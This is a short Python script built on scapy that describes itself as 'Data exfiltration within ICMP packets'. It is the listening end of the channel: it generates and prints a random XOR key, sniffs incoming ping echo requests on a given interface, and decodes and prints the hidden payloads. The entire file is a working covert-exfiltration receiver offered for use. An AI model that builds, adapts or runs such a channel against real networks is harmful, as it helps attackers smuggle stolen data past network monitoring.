#!/usr/bin/env python3

from scapy.all import *
import random as rd
import string
import argparse as ap

def XORDecode(data):
    global key
    unxoreddata = ''.join(chr(charData ^ ord(key[idxData%len(key)])) for idxData, charData in enumerate(data))
    return unxoreddata

def keyGen():
    key = ''.join(rd.choice(string.ascii_letters + string.digits) for _ in range(20))
    return key

def startICMPSniffer(iface):
    print('Starting ICMP sniffer...')
    sniff(filter='icmp [icmptype] == 8', iface=iface, prn=receiveData)

def receiveData(packet):
    raw = packet.getlayer(Raw).load
    print(len(raw))
    print(XORDecode(raw))

def main():
    parser = ap.ArgumentParser(description="Data exfiltration within ICMP packets.")
    parser.add_argument('iface', help='The interface to listen on.')
    args = parser.parse_args()
    
    global key
    key = keyGen()
    print('Use this password to XOR the data: ' + key)
    startICMPSniffer(args.iface)

if __name__ == '__main__':
    main()
